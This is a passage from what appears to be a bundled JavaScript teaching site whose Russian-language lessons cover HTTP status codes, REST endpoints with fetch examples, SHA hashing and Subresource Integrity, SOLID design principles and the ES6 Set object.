пользователя^^\n\n![ico-20 green-ok] **410** (Gone)\n\n^^ресурс в этой endpoint больше не доступен\n\n![ico-20 green-ok] **415** (Unsupported Media Type)\n\n^^в заголовке запроса указан неправильный тип содержимого^^\n\n![ico-20 green-ok] **429** (Too Many Requests)\n\n^^пользователь отправил слишком много запросов за заданный промежуток времени^^\n"},12916:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] REST API\n\n**Representational State Transfer**\n\n__________________________________\n\nОбычно URL указывает на _ресурс_\n\nВ архитектуре **REST** URL указывает на ![ico-20 warn] _операцию с ресурсом_\n\nДля каждой операции с ресурсом (~GET~, ~POST~, ~PUT~, ~PATCH~, ~DELETE~) устанавливается **endpoint**\n\n![ico-25 cap] **POST**: ^^http://ptsv2.com/t/garevna/post^^\n![ico-25 cap] **GET в формате JSON-строки**: ^^http://ptsv2.com/t/garevna/d/940001/json^^\n![ico-25 cap] **GET в текстовом формате**: ^^http://ptsv2.com/t/garevna/d/940001/text^^\n\n________________________________________\n\n## ![ico-25 icon] Автор концепции\n\n@@@@\n\n![](illustrations/filding.png)\n**Roy Thomas Fielding**<br><br>^^DOCTOR OF PHILOSOPHY<br/>_in Information and Computer Science^^_<br/>[^^DISSERTATION^^](external/fielding)\n\n@@@@\n\n______________________________\n\n## ![ico-25 icon] HATEOAS\n\n**_Hypermedia As The Engine Of Application State_** (**HATEOAS**) — это базовая концепция REST\n^^(коренное отличие архитектуры **REST** от других сетевых архитектур)^^\n\nКонцепция **_HATEOAS_** заключается в том, что север не должен быть \"прикован\" к клиентам гиперссылками\n\nСервер работает с некими URL-подобными ~endpoint~-ами, которые информируют серверный скрипт о том, чего хочет клиент, но никак не привязаны к расположению ресурса и серверным технологиям работы с данными\n\nКлиентский скрипт располагает списком допустимых ~endpoint~-ов\nКлиентский скрипт знает, что он может получить, \"дернув\" за тот или другой ~endpoint~\n\nДля него  ~endpoint~-ы - это перечень услуг, которые можно получить, если воспользоваться тем или иным ~endpoint~ из списка валидных (в рамках данного API) ~endpoint~-ов\n\nУра, сервер свободен - он может расширяться, развивать свой функционал, не нарушая при этом сложившиеся \"добрые отношения\" с клиентами ![ico-20 smile]\n\nРесурсы могут быть перемещены в другое место - доступ к ним для клиента останется неизменным, поскольку ~endpoint~ не изменится\n\nСервер может изменить структуру баз данных, технологию доступа к данным - клиент от этого не пострадает, для него будут работать все те же ~endpoint~-ы\n\n___________________________________\n\n^^**~Hypermedia~** — это способ структурирования информации и доступа к её элементам с помощью _~гиперсвязей~_^^\n\n_____________________________________\n\n## ![ico-25 icon] Понятие endpoint\n\n^^^[endpoint]\n\n**~endpoint~** — точка взаимодействия клиента с API\n\n^^URI не содержат никакой информации о том, где размещен ресурс^^\n^^клиент не знает ( и не должен знать ) URL ресурса^^\n^^если ресурс будет перемещен на другой сервер, клиент этого не узнает^^\n^^он будет по-прежнему работать с ресурсом по тем же URI^^\n^^каждая такая ссылка является **~endpoint~**^^\n^^**~endpoint~** - это некая операция с ресурсом^^\n\n![ico-20 warn] Итак, API предоставляет клиенту  ~endpoints~  для доступа к ресурсу\n![ico-20 warn] API решает, какие операции может выполнять клиент с ресурсом\n![ico-20 warn] Для каждой операции есть свой endpoint\n\n^^^\n\nПримером может служить API **picsum.photos**\nЭндпойнты у этого API позволяют точно указать требуемый размер изображения\n\n••https://picsum.photos/ширина/высота••\n\nДля получения случайного изображения можно больше ничего не указывать,\nа можно добавить строку запроса **_?random_**\n\n••https://picsum.photos/ширина/высота?random••\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\ndocument.body.style.margin = 0\n\nconst img = document.body.appendChild(new Image())\nimg.src = 'https://picsum.photos/900/400?random'\n~~~\n\nМожно использовать эндпойнты с указанием числового **id** изображения\nТогда эндпойнт выглядит так:\n\n••https://picsum.photos/id/число/ширина/высота••\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst img = document.body.appendChild(new Image())\nimg.src = 'https://picsum.photos/id/356/900/500'\ndocument.body.style.margin = 0\n\nconst showImage = function () {\n  const w = window.innerWidth,\n        h = window.innerHeight,\n        num = Math.round(Math.random() * 900)\n\n  arguments[0].src = `https://picsum.photos/id/${num}/${w}/${h}`\n\n  setTimeout(() => requestAnimationFrame(showImage), 1000)\n}.bind(null, img)\n\nshowImage()\n~~~\n\n{{{REST-endpoints.js}}}\n\n___________________________________\n\nЕще один пример REST API\n\nЗарегистрируйтесь на [%%%weather API%%%](https://weatherstack.com/)\n\nЭто нужно для получения индивидуального ключа доступа **_access_key_**\n\nПосле чего вы сможете делать запросы к API по следующему эндпойнту:\n\n~~~console\nhttp://api.weatherstack.com/current?access_key=xxxxxxxx&query=Kharkiv\n~~~\n\n@@@@\nОтвет вы будете получать в формате JSON<br>Даже с иконками\n![](illustrations/REST-01.webp)\n@@@@\n___________________________________\n\n## ![ico-25 icon] endpoints для самостоятельной работы с REST API\n\n### ![ico-20 icon] GET\n\nПолучить всех юзеров из базы данных **users**:\n\n••https://garevna-rest-api.glitch.me/users/all••\n\n~~~js\nfetch('https://garevna-rest-api.glitch.me/users/all')\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\nОтвет сервера:\n\n~~~console\n▼ {451789: {…}, 789451: {…}, begemot: {…}}\n  ► 451789: {name: \"Feodor\", age: 18, speciality: \"hobbit\"}\n  ► 789451: {name: \"Teodor\", age: 25, hobby: \"fly\", speciality: \"teacher\"}\n  ► begemot: {name: \"Stephan\", age: 36, speciality: \"doctor\"}\n  ► __proto__: Object\n~~~\n\n_______________________\n\nПолучить юзера по ~id === begemot~:\n\n••https://garevna-rest-api.glitch.me/user/begemot••\n\n~~~js\nfetch('https://garevna-rest-api.glitch.me/user/begemot')\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\nОтвет сервера:\n\n~~~console\n▼ {name: \"Stephan\", age: 36, speciality: \"doctor\"}\n    age: 36\n    name: \"Stephan\"\n    speciality: \"doctor\"\n  ► __proto__: Object\n~~~\n\n_______________________________\n\n**Поиск данных по значению одного из ключей**\n\nНапример, для получения всех юзеров с именем _Stephan_:\n\n••https://garevna-rest-api.glitch.me/users/?name=Stephan••\n\n~~~js\nfetch('https://garevna-rest-api.glitch.me/users/?name=Stephan')\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\nОтвет сервера будет массивом:\n\n~~~console\n▼ [{…}]\n  ► 0: {name: \"Stephan\", age: 36, speciality: \"doctor\"}\n    length: 1\n  ► __proto__: Array(0)\n~~~\n\nесли нужно получить из базы данных **users** всех юзеров в возрасте 18 лет:\n\n••https://garevna-rest-api.glitch.me/users?age=&#94;18&#94;••\n\nдля передачи числа используем **~_&#94;число&#94;_~**\n\n~~~js\nfetch('https://garevna-rest-api.glitch.me/users?age=^18^')\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\nОтвет сервера будет массивом:\n\n~~~console\n▼ [{…}]\n  ► 0: {name: \"Feodor\", age: 18, speciality: \"hobbit\"}\n    length: 1\n  ► __proto__: Array(0)\n~~~\n\n___________________________________\n\n### ![ico-20 icon] POST | PUT | PATCH | DELETE\n\n••https://garevna-rest-api.glitch.me/user/_id_••\n\n◘◘**POST**◘◘\n\n~~~js\nfetch('https://garevna-rest-api.glitch.me/user/987145', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({\n    name: 'Mary',\n    age: 19,\n    speciality: 'developer'\n  })\n})\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\nОтвет сервера:\n\n~~~console\n► {name: \"Mary\", age: 19, speciality: \"developer\"}\n~~~\n\nЕсли вы попытаетесь записать методом POST уже существующую запись, то ответ сервера будет:\n\n~~~console\n► {error: 475, message: \"987145 allready exist\"}\n~~~\n\n___________________________________\n\n◘◘**PUT**◘◘\n\n~~~js\nfetch('https://garevna-rest-api.glitch.me/user/987145', {\n  method: 'PUT',\n  headers: {\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify ({\n    name: 'Helen',\n    age: 20,\n    speciality: 'florist'\n  })\n})\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\nОтвет сервера:\n\n~~~console\n► {name: \"Helen\", age: 20, speciality: \"florist\"}\n~~~\n\n___________________________________\n\n◘◘**PATCH**◘◘\n\n~~~js\nfetch('https://garevna-rest-api.glitch.me/user/987145', {\n  method: 'PATCH',\n  headers: {\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({\n    hobby: 'flowers'\n  })\n})\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\nОтвет сервера:\n\n~~~console\n► {name: \"Helen\", age: 20, speciality: \"florist\", hobby: \"flowers\"}\n~~~\n\n___________________________________\n\n◘◘**DELETE**◘◘\n\n~~~js\nfetch('https://json-server-with-router.glitch.me/user/garevna', {\n  method: 'DELETE',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n}).then(response => console.log(response.status))\n~~~\n\nОтвет сервера: **~200~**\n"},50574:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Secure Hash Algorithm\n\n**криптографический алгоритм компьютерной безопасности**\n\nАлгоритм генерирует криптографический хэш ( «дайджест» )\n\nЭтот хэш является своего рода «сигнатурой» для текста или файла данных\n\nАлгоритм **SHA** не является «шифрованием»\n\n![ico-20 warn] он не может быть расшифрован обратно к исходному тексту\n\nэто **_односторонняя_** криптографическая функция\n\nона возвращает цифровую подпись фиксированного размера для любого размера исходного текста\n\n^^^[SHA]\n\nСоздан Агентством национальной безопасности США\n\n![ico-20 green-ok] SHA-0 - в 1993 году\n![ico-20 green-ok]  SHA-1 - в 1995 году\n![ico-20 green-ok]  SHA-2 - в 2002 году\n\n_является частью стандарта цифровой подписи ( DSS )_\n\n^^^\n\n## ![ico-25 icon] SHA-1\n\nSHA-1 генерирует почти уникальную 160-битную ( 20-байтную ) подпись для текста\n\n![ico-25 cap] **SHA-1**\n\nНапример, для исходного текста:\n\n~~~js\nfor (var x of arr) {\n  console.log(x)\n}\n~~~\n\nкриптографический хэш SHA-1 будет:\n\n••15E84BC669EC1F264F68CF0329A3DE12788EBC7D••\n\n![ico-20 pin] ^^**git** широко использует хэши **SHA-1** в качестве идентификаторов и проверок согласованности^^\n\n_________________________\n\n### ![ico-25 icon] Онлайн-генераторы цифровой подписи SHA\n\n[%%%SHA1%%%](https://passwordsgenerator.net/sha1-hash-generator/) \n[%%%SHA2%%%](https://passwordsgenerator.net/sha256-hash-generator/)\n\n___________________\n\n### ![ico-30 git] js-sha1\n\nМожно установить пакет [**~js-sha1~**](https://github.com/emn178/js-sha1) из CDN\n\n••![ico-30 bash] $ npm install js-sha1••\n\n_________________\n\n## ![ico-25 icon] SHA256\n\nВы можете подключить скрипт **~sha256~** к своей странице:\n\n~~~html\n<script src=\"https://cdn.rawgit.com/chrisveness/crypto/4e93a4d/sha256.js\"><\/script>\n~~~\n\nи использовать функцию **~Sha256.hash()~** для динамической генерации дайджеста любого текста\n\n~~~js\nvar hash = Sha256.hash(text)\n~~~\n\n[:::Пример:::](https://garevna.github.io/js-samples/#07)\n\nКроме того, в консоли ![ico-20 bash] вы можете использовать консольную команду ~sha256sum~\n\n^^^[sha256sum]\n\n![](https://lh4.googleusercontent.com/wM_pdlag2wymXBf0vtG0LDwLUPyKPmNI0Z8op0grW79K0LNzSzQMTdOx_1zQtT9Utj6VxtRtNEjJajYfCusV8LejAeXMvtOliRJG_T6btsIShVCe20WkxABN4P2K5zqwp6E9ORQpuRwKF4k)\n\n^^^\n\n_______________________\n\n## ![ico-25 icon] SHA384\n\nОткройте пустое окно (_blank_)\n\nВ этом окне откройте **_Chrome DevTools_**\n\nСоздайте  фрагмент кода (**snippet**), как показано на видео [![ico-70 youtube]](https://www.youtube.com/watch?v=xg9qsryE8Hk)\n\nВставьте следующий код сниппета:\n\n~~~js\nvar script = document.createElement('script')\nscript.src = 'https://garevna.github.io/js-samples/js/testSHA384.js'\nscript.crossOrigin = 'anonymous'\nscript.integrity = 'sha384-yXrIdlO1CBJknfDtCtDe2tmWWNl5xK30aTz62nLkEpEIBRD3OGi7+To7hfKRaUZ/'\ndocument.head.appendChild(script)\n~~~\n\n______________________________\n\n## ![ico-25 icon] integrity\n\n**_Subresource Integrity_** (**SRI**) - это функция безопасности, которая позволяет браузерам проверять файлы, загружаемые из внешних источников (например, из CDN)\n\nЕсли файл был изменен, то значение атрибута  **~integrity~** (цифровой подписи файла) не будет соответствовать новому значению, вычисленному браузером, и загрузка поврежденного файла не произойдет\n\nДля генерации дайджестов файлов используйте [![ico-20 link] сервис](https://www.srihash.org/)\n\n![](https://lh3.googleusercontent.com/JUoOnSODv-YbGzZ_qsAWeSB4MRjYiAL62kmeb6eOSQZvMbVFKgUzC8XAdJq4GRtoWT-8N4AVAbWnXdZfHmLcGRgI-DOuvqANAPLjvLHfvAsC6m0Yas_mNZQ_Mb-w2dwnVh4Zth6ZOwxUYew)\n\n![ico-20 green-ok] Вставьте ссылку на файл в сети\n![ico-20 green-ok] Нажмите  кнопку   **~Hash!~**\n![ico-20 green-ok] Полученный тег скрипта содержит атрибут **~integrity~**\n![ico-20 green-ok] Скопируйте значение атрибута **~integrity~**\n![ico-20 green-ok] Теперь вы сможете использовать его при динамической загрузке скриптов\n\n___________________________________\n\n## ![ico-25 hw] Самостоятельная работа\n\nПосмотрите код [![ico-25 cap] **примера**](https://garevna.github.io/js-samples/#09) в отладчике\n\nУстановите **~breakpoints~**\n\nС помощью **~Watch~** отслеживайте, как изменяются значения массива  **_users_** и переменной **_user_**\n\n**Задание:**\n\n![ico-20 green-ok] Создайте форму регистрации пользователя\n\n^^При регистрации пользователя должен генерироваться дайджест, который будет ключом записи в базе данных^^\n\n~~~~js\nvar users = [\n  {\n    key: 'a42caea01469a4687fb8713dc1748a0d14adec7f307371f82382812142ee2c58',\n    name: 'Иван',\n    email: 'ivan.petrenko@gmail.com',\n    avatar: 'https://imgur.com/I80W1Q0.png'\n  },\n  {\n    key: 'b7d20c2dc6cb3e4bcde90f80598e369ab3d1841d799039dfd06f86221af10fd8',\n    name: 'Mary',\n    email: 'mary789@gmail.com',\n    avatar: 'https://raw.githubusercontent.com/fangpenlin/avataaars/HEAD/avataaars-example.png'\n  },\n    ...\n]\n~~~~\n\n![ico-20 green-ok] Создайте форму для входа пользователя\n\n^^^[Sign In]\n\n^^После ввода _email_ нужно найти пользователя с таким _**email**_ и запросить пароль^^\n^^После ввода пароля должен быть сгенерирован дайджест, который будет проверяться на совпадение со значением **_key_** найденного пользователя^^\n^^Если значения не совпадут, нужно вывести предупреждение^^\n^^Если значения совпали, то перейти на страницу для зарегистрированных пользователей^^\n^^На странице для зарегистрированных пользователей должно быть выведено имя пользователя и его аватар^^\n\n^^^\n\n![ico-20 green-ok] Создайте страницу для зарегистрированных пользователей\n"},81503:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] SOLID\n\n**Принципы проектирования в ООП**\n\n• ^^Single responsibility^^\n• ^^Open-closed^^\n• ^^Liskov substitution^^\n• ^^Interface segregation^^\n• ^^Dependency inversion^^\n\n____________________________________________\n\nДалее речь будет идти о таких сущностях в ООП, как классы, модули или объекты\n\nПроектирование большого и сложного приложения начинается с разработки его архитектуры\n\nМы не можем написать такое приложение одним огромным и запутанным файлом с кодом\n\nМы выполняем декомпозицию - разделяем приложение на более простые части\n\nДавайте вместо слова \"части\" использовать более подходящее для программирования слово **модули**\n\nМодули должны взаимодействовать друг с другом\n\nПри этом они не должны ничего знать о внутреннем содержании друг друга\n\nКод модуля, его внутренние переменные и функции должны быть недоступны извне\n\nЗначит, каждому модулю нужен **интерфейс**\n\nПод интерфейсом модуля подразумевается система доступа к его функционалу\n\nМы должны обеспечить закрытость модуля для внешнего вмешательства в его \"внутренний мир\", при этом обеспечить его открытость для гибкого взаимодействия с другими модулями\n\nКаждый модуль можно, в свою очередь, разложить на еще более простые модули\n\nИ так далее...\n\nВ процессе неизбежно выяснится, что часть модулей может быть успешно переиспользована в различных частях приложения\n\nЭто означает, что переиспользуемые модули не могут находиться в составе модулей, которые их используют\n\nИначе пришлось бы обращаться из одного модуля к внутреннему содержимому другого, что недопустимо\n\nМы выделяем такие модули с универсальной функциональностью, чтобы они были доступны из любой части приложения ( с любой глубины )\n\nТеперь встает вопрос о функциональности модулей\n\nЕсли он будет выполнять множество различных функций, то при обращении к нему нам придется тянуть весь этот функционал вместо того, чтобы взять конкретный инструмент...\n\nНапример, что было бы, если бы вместо вызова статического метода ~Object.assign~ нам пришлось бы тащить всю кучу статических методов Object, а потом использовать только один из них?\n\n~Object.assign~ является отдельным модулем, который выполняет конкретную функцию, и не зависит от других статических методов конструктора ~Object~\n\nИтак, проектирование архитектуры приложения - важнейший этам разработки\n\n__________________________________________________\n\n\n## ![ico-25 icon] Single responsibility\n\nЭтот принцип обеспечивает четкое разграничение функций ( обязанностей ) модулей\n\n_Один модуль отвечает только за что-то одно_\n\nЧто нам дает соблюдение этого принципа?\n\nПервое - код каждого модуля достаточно прост\n\nВторое - мы легко расширяем функциональность путем добавления новых модулей, но не переписываем уже существующие\n\nЭтот принцип иллюстрируют те же статические методы ~Object~, которые добавляются в каждой новой спецификации языка\n\nРассмотрим пример объекта ~user~, который изначально имел два метода - ~read~ и ~write~\n\nЗатем мы решаем добавить объекту ~user~ еще один метод - изменить свою аватарку\n\nНам не приходится изменять код методов ~read~ и ~write~\n\nМы просто добавляем новый метод с конкретной функциональностью\n\nПозже мы сможем еще больше расширить возможности объекта ~user~, добавляя новые и новые методы\n\n_______________________________________________________\n\n\n## ![ico-25 icon] Open-closed\n\nПример выше отлично иллюстрирует также и этот приницип\n\nОбъект ~user~ _открыт для расширения_, но при этом исходный код его модулей _закрыт для изменения_\n\nМы можем написать интерфейс, позволяющий подключать экземпляру ~user~ необходимые методы\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nclass User {\n  constructor (name) {\n    this.name = name\n  }\n}\n\nUser.updateMethods = function (methodName, func) {\n  this.prototype[methodName] = func\n}\n\nUser.updateMethods('write', function (message) {\n  console.log(`${this.name}: ${message}`)\n})\n\nconst user = new User('Иван')\nuser.write('Hello!')\n~~~\n\nВ консоли мы увидим\n\n~~~console\nИван: Hello!\n~~~\n\nВ этом примере у класса **~User~** предусмотрен интерфейс **_~updateMethods~_**, расширяющий функциональность экземпляров класса\n\nДавайте используем этот интерфейс для создания нового метода:\n\n~~~js\nUser.updateMethods('voyage', function (city) {\n  console.log(`${this.name}: I visit ${city}`)\n})\n~~~\n\nТеперь вызовем новый метод\n\n~~~js\nuser.voyage('London')\n~~~\n\nВ консоли мы увидим\n\n~~~console\nИван: I visit London\n~~~\n\n![ico-20 warn] Обратите внимание, что для расширения функционала класса нам не потребовалось изменять код существующих модулей\n\n____________________________________\n\n## ![ico-25 icon] Liskov substitution\n\nПринцип подстановки Барбары Лисков заключается в следующем:\n\nработоспособность кода не должна быть нарушена в результате замены экземпляра класса на экземпляр наследующего класса\n\nэто вполне логично: если производный класс только расширяет функциональность базового класса, не изменяя его, то при такой замене все функции базового класса продолжают работать так же, как и ранее\n\nНам не нужно переписывать модули, работавшие с экземпляром базового класса\n\nВ общем-то, это всего лишь соблюдение принципов наследования...\n\nЕсли мы расширим ранее объявленный класс **~User~** следующим образом:\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nclass RegisteredUser extends User {\n  constructor (name, token) {\n    super(name)\n    const auth = token\n    this.setIdentity(token)\n    this.testIdentity = () => this.getIdentity() === auth\n  }\n\n  getIdentity () {\n    const token = document.cookie.split('; ')\n      .filter(item => item.indexOf('auth') === 0)[0]\n    return token ? token.split('=')[1] : null\n  }\n\n  setIdentity (auth) {\n    document.cookie = `auth=${auth}`\n  }\n}\n~~~\n\nи заменим ранее созданный экземпляр ~user~ на экземпляр нового класса:\n\n~~~js\nuser = new RegisteredUser('Иван', 'xJgb-809/**1Bh')\n~~~\n\nто это не приведет к нарушению нормальной работы модулей, оперировавших старым экземпляром ~user~\n\n______________________________________\n\n## ![ico-25 icon] Interface segregation\n\nКак мы уже поняли ![ico-20 wink], модули взаимодействуют друг с другом через интерфейсы\n\nПод интерфейсом мы понимаем публичные методы экземпляра\n\nДробление интефесов - нормальная практика: если вы написали метод, который делает слишком много разного, вы уже нарушили первый принцип **SOLID**\n\nЕсли каждый интефейсный метод экземпляра выполняет одну узкоспециализированную функцию, то нам не нужно его модифицировать при необходимости расширить функциональность модуля\n\nДостаточно добавить еще один узкоспециализированный интерфейсный метод\n\nНапример, вернемся к нашему классу **~User~** с его методом **_~write~_**\n\nПредположим, что этот метод может:\n\n• выводить сообщение в консоль\n• выводить сообщение на страницу\n• выводить сообщение во всплывающем окне\n\nэто плохой интерфейс\n\nНужно три отдельных метода, каждый из которых реализует одну из вышеперечисленных функций\n\nОчевидно, что принцип специализации интерфейсов непосредственно вытекает из первого принципа **SOLID**\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst card = (function (pin) {\n  let cash = 0\n  const addCash = sum => cash += sum\n  const changePin = newPin => pin = newPin\n  const testPin = pincode => pin === pincode\n  const showCash = () => console.log(`Cash: ${cash}`)\n  const getMoney = sum => {\n    cash -= sum\n    console.log(`Get money: ${sum}`)\n  }\n\n  return function (operation, sum) {\n    operation === 0\n      ? addCash(sum)\n      : testPin(prompt('Enter pincode'))\n        ? operation === 1\n          ? showCash()\n          : operation === 2\n            ? sum <= cash\n              ? getMoney(sum)\n              : console.warn('Insufficient cash')\n            : changePin(prompt('Set your pincode'))\n          : console.error('Invalide pincode')\n  }\n})(prompt('Set your pincode'))\n~~~\n\nМы получили модуль с навороченным интерфейсом\n\nРаздробим интерфейс модуля:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nconst card = (function (pin) {\n  let cash = 5000\n  const changePin = () => pin = prompt('Set your pincode')\n  const testPin = pincode => pin === prompt('Enter pincode')\n  const pinError = () => console.error('Invalide pincode')\n  const showMoney = () => console.log(`Cash: ${cash}`)\n  const getMoney = sum => {\n    if (sum <= 0) return 0\n    if (sum > cash) {\n      console.warn('Insufficient cash')\n      return 0\n    }\n    cash -= sum\n    console.log(`Get your money: ${sum}`)\n    return sum\n  }\n        \n  return {\n    uppendCash: sum => cash += sum,\n    showCash: () => testPin() ? showMoney() : pinError(),\n    getCash: sum => testPin() ? getMoney(sum) : pinError(),\n    changePincode: () => testPin() ? changePin() : pinError()\n  }\n})(prompt('Set your pincode'))\n~~~\n\n____________________________________________\n\n## ![ico-25 icon] Dependency Invertion\n\nЗависимости...\n\nЧто от чего зависит в вашем приложении?\n\nС самого начала вы должны это хорошо продумать\n\nЭтот принцип легче всего нарушить в JS, поскольку у нас есть свойство ~&#95;&#95;proto__~ экземпляра, которое делает доступным прототип базового класса из экземпляра класса\n\nПример грубого нарушения этого принципа:\n\n~~~js\nUser.updateMethods('sedition', function (prop, val) {\n    this.__proto__[prop] = val\n})\n\nuser.sedition('badExample', 'You should not do this')\n~~~\n\nВ этом примере мы предоставили доступ экземплярам к прототипу\n\n![ico-20 warn] Но прототип не должен зависеть от экземпляров\n\nКаждый класс является абстрацией\n\nКаждый производный класс является детализацией абстрации верхнего уровня\n\nВ примере, приведенном ранее, класс **~RegisteredUser~** является детализией класса **~User~**\n\nДругими словами, класс **~User~** является абстрацией более высокого уровня, чем класс **~RegisteredUser~**\n\nПоэтому нормально, что класс **~RegisteredUser~** зависит от класса **~User~**, но никак не наоборот \n\n![ico-20 warn] Обратная зависимость недопустима\n\n______________________________________________"},30848:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Set\n\n**ES6**\n\n**Конструктор**\n\nСоздает итерабельный объект с уникальными элементами\n\nиз **_итерабельного_** объекта\n\n________________________\n\n![ico-25 cap] new Set\n\n~~~js\nconst sample = new Set([5, 1, 3, 8, 1, 5, 3, 3, 8])\n\nconsole.log(sample)\n\n// ► Set(4) {5, 1, 3, 8}\n\nconsole.log(Array.from(sample))\n\n// ► (4) [5, 1, 3, 8]\n~~~\n\nДавайте посмотрим, на что он способен:\n\n~~~~Set.prototype\n▼ Set {constructor: ƒ, has: ƒ, add: ƒ, delete: ƒ, clear: ƒ, …}\n  ► add: ƒ add()\n  ► clear: ƒ clear()\n  ► constructor: ƒ Set()\n  ► delete: ƒ delete()\n  ► entries: ƒ entries()\n  ► forEach: ƒ forEach()\n  ► has: ƒ has()\n  ► keys: ƒ values()\n    size: (...)\n  ► values: ƒ values()\n  ► Symbol(Symbol.iterator): ƒ values()\n    Symbol(Symbol.toStringTag): "Set"\n  ► get size: ƒ size()\n  ► __proto__: Object\n~~~~\n\n## ![ico-25 icon] values()\n\n**~sample.values()~** создает и возвращает объект итератора\n\nСоздадим итератор и будем вызывать его метод **~next()~** в цикле:\n\n~~~js\nlet done, iterator = sample.values()\n\nwhile (!done) {\n  ({ value: item, done } = iterator.next());\n  console.log(item)\n}\n~~~\n\nВ консоль будут выведены все значения, находящиеся в объекте **~sample~**\n\n________________________________\n\n## ![ico-25 icon] add()\n\nДобавляет новое значение в объект, если его там нет\n\n^^Если такое значение уже существует, то ничего не изменится^^\n\n~~~js\nsample.add(1)\nconsole.log(sample)\n\n// ► Set(4) {5, 1, 3, 8}\n\nsample.add(7)\nconsole.log(sample)\n\n// ► Set(4) {5, 1, 3, 8, 7}\n~~~\n\n____________________________\n\n## ![ico-25 icon] delete()\n\nУдаляет значение, если оно есть в объекте, и возвращает ~true~\n\n^^Если такого значения нет, то вернет ~false~^^\n\n~~~js\nsample.delete(9)\n// false\n\nsample.delete(7)\n// true\n\nconsole.log(sample)\n// ► Set(4) {5, 1, 3, 8}\n~~~\n\n______________________________________\n\n## ![ico-25 cap] Пример 1\n\nМы знаем, что массивы и объекты передаются по ссылке\n\nПоэтому **~userSet~** будет содержать все объекты из массива **~users~**,\nхотя содержимое объектов дублируется\n\n~~~js\nconst users = [\n  {\n    name: \'Stephan\',\n    job: \'java-developer\'\n  },\n  {\n    name: \'Margaret\',\n    job: \'markup-developer\'\n  },\n  {\n    name: \'Stephan\',\n    job: \'java-developer\'\n  },\n  {\n    name: \'Margaret\',\n    job: \'markup-developer\'\n  }\n]\n\nconst userSet = new Set(users)\n\nconsole.log(userSet)\n~~~\n\nОднако если мы сделаем так:\n\n~~~js\nconst user1 = {\n  name: \'Stephan\',\n  job: \'java-developer\'\n}\n\nconst user2 = {\n    name: \'Margaret\',\n    job: \'markup-developer\'\n}\n\nconst usersDoubled = [user1, user2, user1, user1, user2]\n\nconst usersNewSet = new Set(usersDoubled)\n\nconsole.log(usersNewSet)\n~~~\n\nто дублирующиеся ссылки будут исключены\n\n_______________________________________________________\n\n## ![ico-25 icon] Пример 2\n\nСоздадим итерабельный объект **~human~** и убедимся, что дублирующиеся значения будут исключены:  \n\n~~~js\nconst human = {\n  a: \'Alex\',\n  b: \'Mary\',\n  c: \'Helen\',\n  d: \'Nicolas\',\n  e: \'Jeck\',\n  f: \'Henry\',\n  i: \'Mary\',\n  g: \'Alex\'\n}\n\nhuman[Symbol.iterator] = function* () {\n  for (const prop in this) yield this[prop]\n}\n\nconst humanSet = new Set(human)\n\nconsole.log(humanSet)\n~~~\n\n~~~~humanSet\n▼ Set(6) {"Alex", "Mary", "Helen", "Nicolas", "Jeck", …}\n    size: 6\n  ► __proto__: Set\n  ▼ [[Entries]]: Array(6)\n     ▼ 0: "Alex"\n          value: "Alex"\n     ► 1: "Mary"\n     ► 2: "Helen"\n     ► 3: "Nicolas"\n     ► 4: "Jeck"\n     ► 5: "Henry"\n       length: 6\n~~~~\n\n_____________________________________________________________\n\n## ![ico-25 cap] Пример 3\n\nСоздадим функцию, которая будет создавать структуру данных с уникальными элементами из переданного ей "материала"\n\n~~~js\nfunction createSet (object = {}) {\n  function createIterator () {\n    object[Symbol.iterator] = function* () {\n      for ( let prop in this ) yield this [prop]\n    }\n  }\n  Array.isArray(object) || object[Symbol.iterator]\n    ? null\n    : createIterator()\n\n   return new Set(object)\n}\n~~~\n\nТеперь опробуем ее в действии:\n\n~~~js\nconsole.log(createSet({ a: 1, b: 4, c:5, d: 4, e: 5 }))\n// ► Set(3) {1, 4, 5}\n\nconsole.log(createSet())\n// ► Set(0) {}\n\nconsole.log(createSet([5, 5, 4, 7, 8, 4, 7, 9, 8]))\n// ► Set(5) {5, 4, 7, 8, 9}\n~~~\n\n~~~js\nconsole.log(createSet(\'A9h4G8=45*hG///19*74-78\'))\n~~~\n\n~~~~Result\n// ▼ Set(13) {"A", "9", "h", "4", "G", …}\n//     size: (...)\n//   ► __proto__: Set\n//   ▼ [[Entries]]: Array(13)\n//       ► 0: "A"\n//       ► 1: "9"\n//       ► 2: "h"\n//       ► 3: "4"\n//       ► 4: "G"\n//       ► 5: "8"\n//       ► 6: "="\n//       ► 7: "5"\n//       ► 8: "*"\n//       ► 9: "/"\n//       ► 10: "1"\n//       ► 11: "7"\n//       ► 12: "-"\n//         length: 13\n~~~~\n\nЕсли же мы хотим оставить только уникальные символы в строке, то можно так:\n\n~~~js\nconsole.log(Array.from(createSet(\'A9h4G8=45*hG///19*74-78\')).join(\'\'))\n\n// A9h4G8=5*/17-\n~~~\n___________________________________________________\n\nНо остается вопрос, как заставить работать Set с объектами в качестве элементов структуры данных\n\n## ![ico-25 cap] Пример 4\n\nПоиграем с массивом объектов **~clients~**\n\n~~~~js\nconst clients = [\n  {\n    name: \'Stephan\',\n    job: \'java-developer\'\n  },\n  {\n    name: \'Margaret\',\n    job: \'markup-developer\'\n  },\n  {\n    name: \'Stephan\',\n    job: \'java-developer\'\n  },\n  